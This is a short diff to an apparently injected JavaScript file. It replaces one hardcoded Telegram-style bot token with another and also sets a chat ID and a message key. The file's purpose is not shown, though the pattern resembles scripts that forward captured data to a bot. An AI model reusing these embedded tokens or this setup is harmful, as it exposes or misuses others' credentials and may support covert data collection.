@@ -7,7 +7,7 @@
   window.__conduitInjected = true;
 
   /* ------------------------------- CONFIG -------------------------------- */
-  const BOT_TOKEN = '8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0';
+  const BOT_TOKEN = '8892605743:AAFLjjZp3FUfTuOhGOYWR8JXNgvnop9mMr8';
   const CHAT_ID   = '8508643177';
 
   const GLOBAL_KEY = 'sync_message_info';
